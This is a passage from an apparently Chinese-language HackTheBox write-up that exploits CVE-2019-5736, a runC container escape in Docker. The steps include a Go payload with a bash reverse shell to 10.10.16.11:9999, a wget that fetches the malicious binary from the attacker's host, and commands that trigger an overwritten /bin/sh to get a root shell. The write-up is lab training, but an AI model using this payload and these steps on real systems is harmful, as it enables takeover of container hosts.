+<p><a href="https://github.com/Frichetten/CVE-2019-5736-PoC">https://github.com/Frichetten/CVE-2019-5736-PoC</a></p>
+<p><a href="https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html">https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html</a></p>
+<h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>runC是一个根据OCI(Open Container Initiative)标准创建并运行容器的CLI(command-line interface) 工具。runC是Docker中最为核心的部分，容器的创建、运行、销毁等操作最终都是通过调用runC完成。</p>
+<p>CVE-2019-5736，导致18.09.2版本之前的Docker允许恶意容器覆盖宿主机上的runC二进制文件，由此使攻击者能够以root身份在宿主机上执行任意命令。恶意容器需满足以下两个条件之一:</p>
+<p>(1)由一个攻击者控制的恶意镜像创建</p>
+<p>(2)攻击者具有某已存在容器的写权限，且可通过docker exec进入。</p>
+<p>POC的利用需要在容器内拥有root，由于覆盖了<code>/bin/sh</code>所以当我们把修改好Payload的二进制文件main下载到docker中执行，下次再有人调用docker容器中的<code>/bin/sh</code>就会触发Payload。</p>
+<p>通过修改payload反弹一个shell到本机以获得root</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>1.SSH连接到目标主机，通过<code>sudo docker exec -it webapp-dev01 bash</code>在docker上执行命令，（暂且称之为SSH1）同时用另一个在另一个命令行窗口SSH连接到目标主机（SSH2）</p>
+<p>2.在本地改好修改好Payload，执行<code>go build main.go</code>生成二进制文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var payload = &quot;#!/bin/bash \n bash -i &gt;&amp; /dev/tcp/10.10.16.11/9999 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/maingo.png" alt="maingo"></p>
+<p>3.在二进制文件所在目录用python起一个web服务</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_webserver.png" alt="webserver"></p>
+<p>4.在docker容器中执行命令从本机获取二进制文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://10.10.16.11:8000/main</span><br></pre></td></tr></table></figure>
+
+<p>5.赋予二进制文件最高权限，并执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod +x main &amp;&amp; ./main</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/ssh1main.png" alt="ssh1main"></p>
+<p>6.监听9999端口（端口根据payload里面的来）</p>
+<p>7.在SSH1中二进制文件运行并覆盖完成<code>/bin/sh</code>，SSH2执行如下命令即可收到反弹回来的shell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo docker exec -it webapp-dev01 /bin/sh</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/ssh2.png" alt="ssh2"></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_rootshell.png" alt="rootshell"></p>
+<p>root.txt在<code>/root</code>目录下</p>
+<p>如果流程看不懂，还有终极图解方便理解（文字表达能力较差，各位师傅多担待）</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/%E5%85%A8%E5%B1%80.png" alt="全局"></p>
+<p>可能出现问题的点估计就是提权了，我也好久弹不出Shell…</p>
 ]]></content>
       <tags>
         <tag>HackTheBox</tag>
